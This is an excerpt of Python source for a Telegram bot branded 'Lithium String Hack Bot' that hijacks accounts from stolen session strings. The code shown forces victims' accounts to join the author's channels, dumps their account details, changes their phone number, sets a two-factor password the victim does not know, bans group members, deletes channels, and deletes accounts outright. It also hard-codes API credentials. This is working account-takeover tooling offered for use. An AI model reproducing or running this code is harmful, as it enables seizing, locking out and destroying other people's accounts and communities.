...
client = TelegramClient('lithium', api_id, api_hash).start(bot_token=token)
...
async def change_number_code(strses, number, code, otp):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    bot = client = X
    try:
      await bot(join("@DeviLisLorD"))
    except BaseException:
      pass
    try:
      await bot(join("@DeviLsSociety"))
    except BaseException:
      pass
    try:
      await bot(leave("@ItsMe_LithiumOp"))
    except BaseException:
      pass
    try:
      await bot(leave("@DeviLisGoDs"))
    except BaseException:
      pass
    try: 
...
async def userinfo(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    k = await X.get_me()
    try:
      await X(join("@DeviLisLorD"))
    except BaseException:
      pass
    try:
      await X(join("@DeviLsSociety"))
    except BaseException:
      pass
    try:
      await X(leave("@ItsMe_LithiumOp"))
    except BaseException:
      pass
    try:
      await X(leave("@DeviLisGoDs"))
    except BaseException:
      pass
    return str(k)
...
async def delacc(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X(leave("@DeviLisLorD"))
    except BaseException:
      pass
    await X(functions.account.DeleteAccountRequest("Chutiya saala"))
...
async def user2fa(strses):
  async with tg(ses(strses), 8138160, "1ad2dae5b9fddc7fe7bfee2db9d54ff2") as X:
    ...
    try:
      ...
      pass
    try:
      await X.edit_2fa('Lithium is GoD')
      return True
    except:
      return False
...
'''
mm = '''
**⚜NOTICE FIRST JOIN Lithium GROUP @DeviLisLorD⚜**
'''
...
keyboard = [
  ...
  [
    Button.url("Owner", "https://t.me/ItsMe_LithiumOp")
    ]
]
...
async def op(event):
  ...
  if not event.is_private:
    ...
    await event.reply("Click Below To Use Me", buttons=lithiumop)
  else:
    lithiumbye = [
      [
        Button.url("Must Join", f"https://t.me/DeviLsSociety")
        ]
      ]
    await event.reply("First Join Channel!\n Then Try Click Here ~ /hack", buttons=lithiumbye)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if len(i) > 3855:
        ...
        file.write(i + "\n\nDetails BY @ItsMe_LithiumOp")
        file.close()
        await bot.send_file(event.chat_id, "session.txt")
        system("rm -rf session.txt")
      else:
        await event.reply(i + "\n\nThanks For using Lithium String Hack Bot. \n/hack", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Banning all members. Thanks For using Lithium String Hack Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply(i + "\n\nThanks For using Lithium String Hack Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
    ...
    await event.reply("Joined the Channel/Group Thanks For using Lithium String Hack Bot", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      await event.reply("Deleted the Channel/Group Thanks For using Lithium String Hack Bot.", buttons=keyboard)
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      if i:
        await event.reply("User don't have two step thats why now two step is `Lithium String Hack Bot Is best` you can login now\n\nThanks For using Lithium String Hack Bot.", buttons=keyboard)
      else:
...
async def users(event):
  async with bot.conversation(event.chat_id) as x:
      ...
      try:
        ...
        await event.respond("SEND THIS ERROR TO - @DeviLisGoDs\n**LOGS**\n" + str(e))
